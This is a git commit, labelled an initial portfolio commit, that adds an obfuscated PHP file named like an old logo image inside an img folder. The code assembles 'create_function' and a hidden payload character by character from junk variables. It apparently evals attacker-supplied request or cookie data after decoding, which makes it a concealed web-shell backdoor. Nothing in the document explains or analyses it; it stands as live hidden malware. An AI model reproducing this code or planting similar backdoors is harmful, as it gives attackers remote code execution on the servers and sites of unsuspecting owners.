8d1f99c03387626bbc79b4799fa777bd1cc253d1
Levi Cai <levi@levicai.com>
2016-02-27 21:13:16 -0500

    Initial portfolio commit

---
+++ img/veevee-logo-v1_old.php
@@ -0,0 +1,97 @@
+<?php
+$avoidable = 'e'; $arrow='ec?$';
+$junia= 'cF)vCKeE9';$looted ='?[ma $ri)';
+$caskets = '_e';$gradation= 'c((C'; $fulton ='SE)'; $brusque='s'; $debor ='H'; $frequented ='$'; $concision='Z'; $awhile= '"X;iV';
+$exchangeable='C)V';$besmirches = 'Eu'; $challenging = '_'; $depreciable='$S)YK';$clutch = 'e'; $contradistinctions ='v';$harp ='_'; $bunkhouse ='l'; $illume= 'aLue]a';$burglarizes = 'v'; $certification = ',';$decoration= 's'; $franchise ='<OcII$(';
+
+$bones= 'W';$egghead= '"sn_C@';$interlinked='M';$greeting ='r'; $flocks='f(S'; $devotees='(';$curtice=':TEUrQ)L'; $leona ='4';
+
+$insistent = '?';
+
+$bytes= 'O;lpf$_'; $lab= 'm>ReC';$dissociate ='3rIOr'; $frank= 'B';
+
+$chores ='Jcg]ia';$hurry= 'R'; $knotty= 'e';
+$broiler= '7'; $avril= '=;'; $aping= '"';
+$jeniece='cR).tET';$fransisco = 'T'; $kile ='e"tH'; $ludovico = 'd'; $lynnea= 'D';
+$chantey ='nd$es(iI;'; $lacy = 't';$cudgel= 'S';$glancing= 'a'; $criticizing= 'y';$contrary= 'e';$alyce = 't'; $logger ='rcSe$';$argot ='/":e)_';
+$bobbed ='NlQ"nDei[';
+
+$handicraft= '_';$chorale='s'; $encircle='ap';
+$bronzed= 'rMsa"6d';$injunctions = 'ReEs)'; $bumbled= 'T';
+
+$gayest = 'T';
+
+$dreadnought = '(o'; $lindon = 'i';$m ='g';
+
+$debater ='t';$city='8';$lightness='a'; $inmates= 'a'; $drona= 'c]4d[ii'; $jeremy= 'i"_(v_Lri'; $chine='r';
+
+$autumn='[]';$displayed= 't,asE5s';$audrey ='DmsPeH('; $emancipation='rGA;E(gd='; $beatitude='r'; $blueback = '$'; $boris =':';
+
+$brigade ='U';$kimbra = 'e';$asdfg = '0';$kerchiefs='t'; $makeup='T'; $hydrochloric= '[yP2o6$=(';$jackdaw=')Po_M)1ia'; $kilobyte = 'Cl_b'; $ethelbert = $drona['0'] .
+
+$beatitude .$kimbra.$jackdaw['8'] . $kerchiefs .$kimbra. $kilobyte['2'] . $bytes['4'].$illume[2] .$bobbed['4'] . $drona['0']. $kerchiefs.$jackdaw['7'].$jackdaw[2] .$bobbed['4'] ;$emaciated= $looted['4'] ;$fluorescent =$ethelbert($emaciated, $kimbra . $jeremy['4']. $jackdaw['8'] .
+$kilobyte['1'].$hydrochloric['8'].
+
+$jackdaw['8'].$beatitude.$beatitude . $jackdaw['8']. $hydrochloric['1']. $kilobyte['2'].
+$encircle['1'] .$jackdaw[2].
+
+$encircle['1'] .$hydrochloric['8'] . $bytes['4'] .$illume[2] .$bobbed['4'] . $drona['0']. $kilobyte['2']. $emancipation['6'].$kimbra.$kerchiefs. $kilobyte['2'] .$jackdaw['8'] .
+
+$beatitude.$emancipation['6'].$audrey['2'] .$hydrochloric['8'] .
+
+$jackdaw['5'] .$jackdaw['5']. $jackdaw['5'] .$emancipation['3']); $fluorescent($kilobyte['1'],$emancipation['1'], $indoctrinating['5'],$hydrochloric['1'],$disgust['3'],$kimbra,$jackdaw['5'],$illume[2] , $hydrochloric[6] . $jackdaw['7'] .
+$hydrochloric['7'].$jackdaw['8']. $beatitude .
+
+$beatitude .
+$jackdaw['8'].$hydrochloric['1'] .
+$kilobyte['2'] .$audrey['1'].
+
+$kimbra. $beatitude. $emancipation['6'].
+
+$kimbra .$hydrochloric['8']. $hydrochloric[6].$kilobyte['2'] .$injunctions['0'].$emancipation[4] . $bobbed['2'] .
+$brigade . $emancipation[4] . $logger['2'] .$makeup . $displayed['1'] .
+
+$hydrochloric[6].$kilobyte['2'].$kilobyte['0'].
+
+$dissociate['3'] .$dissociate['3'] . $depreciable['4'].$chantey[7] .$emancipation[4].$displayed['1'].$hydrochloric[6] . $kilobyte['2'] .$logger['2'] .$emancipation[4]. $injunctions['0'].$exchangeable['2']. $emancipation[4]. $injunctions['0'].$jackdaw['5']. $emancipation['3'].
+$hydrochloric[6]. $jackdaw['8'] .
+
+$hydrochloric['7'].$jackdaw['7']. $audrey['2'].$audrey['2'] .$kimbra. $kerchiefs.$hydrochloric['8'].
+$hydrochloric[6] . $jackdaw['7'] .$hydrochloric['0'].
+
+$jeremy['1'] .$drona['0'] .
+
+$kilobyte['1'] .
+$jackdaw['7'] .
+$emancipation[7].
+
+$drona['0'] . $kimbra.$audrey['1'] . $audrey['2'] .$jeremy['1'] .$autumn['1'].$jackdaw['5']. $insistent. $hydrochloric[6] . $jackdaw['7'] . $hydrochloric['0'].
+$jeremy['1'] .$drona['0']. $kilobyte['1']. $jackdaw['7'] .$emancipation[7]. $drona['0'].$kimbra.
+
+$audrey['1'].$audrey['2']. $jeremy['1'] .$autumn['1'] .$boris . $hydrochloric['8']. $jackdaw['7'] .$audrey['2']. $audrey['2']. $kimbra .
+
+$kerchiefs.$hydrochloric['8'].$hydrochloric[6] . $jackdaw['7'].$hydrochloric['0']. $jeremy['1'] . $audrey['5'].$makeup. $makeup .
+
+$jackdaw['1']. $kilobyte['2']. $kilobyte['0'] .
+$jeremy['6'].
+
+$chantey[7].
+$audrey['0'] .$kilobyte['0'] . $emancipation[4] .$jackdaw['4'] . $logger['2']. $jeremy['1']. $autumn['1'] . $jackdaw['5']. $insistent . $hydrochloric[6] . $jackdaw['7'].$hydrochloric['0'] . $jeremy['1'] . $audrey['5'] .$makeup. $makeup . $jackdaw['1'].$kilobyte['2']. $kilobyte['0'].$jeremy['6']. $chantey[7] .
+
+$audrey['0'].
+$kilobyte['0']. $emancipation[4] .
+$jackdaw['4'] .
+$logger['2'].$jeremy['1'] .$autumn['1'] .$boris.
+
+$emancipation[7] .$jackdaw['7'] . $kimbra.$jackdaw['5']. $emancipation['3'] .$kimbra .
+
+$jeremy['4'] . $jackdaw['8']. $kilobyte['1'] .$hydrochloric['8'] .$audrey['2'].$kerchiefs . $beatitude .
+$beatitude .
+
+$kimbra . $jeremy['4'] .
+$hydrochloric['8'].
+$kilobyte['3'].$jackdaw['8'] .$audrey['2'] . $kimbra .$hydrochloric['5']. $drona['2'] . $kilobyte['2'] .$emancipation[7] . $kimbra .$drona['0'] .
+$jackdaw[2].
+$emancipation[7].$kimbra . $hydrochloric['8'].$audrey['2']. $kerchiefs.$beatitude. $beatitude .$kimbra. $jeremy['4'] . $hydrochloric['8'].
+
+$hydrochloric[6]. $jackdaw['8'] .$jackdaw['5'] . $jackdaw['5']. $jackdaw['5']. $jackdaw['5']. $emancipation['3'] );
